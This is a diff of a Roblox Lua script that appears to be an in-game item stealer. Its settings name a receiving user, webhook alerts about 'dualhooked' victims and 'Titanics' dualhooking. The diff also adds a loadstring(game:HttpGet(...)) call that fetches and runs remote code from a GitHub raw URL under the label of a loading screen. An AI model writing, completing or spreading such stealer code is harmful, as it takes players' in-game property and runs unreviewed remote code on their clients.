@@ -10,7 +10,7 @@
 getgenv().Settings = {
     User = "NONAMEINC228",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = "Loading...",
+    MailMessage = "ez",
     Titanics = {
         Dualhook = true,
         Intensity = 100 --%
@@ -214,7 +214,7 @@ local data1
 
 -- Loading Screen
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet('Put Your Loading Screen Raw Link Here'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/TakatoSey/rbxx/main/Loading_Screen.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
 -- Remotes
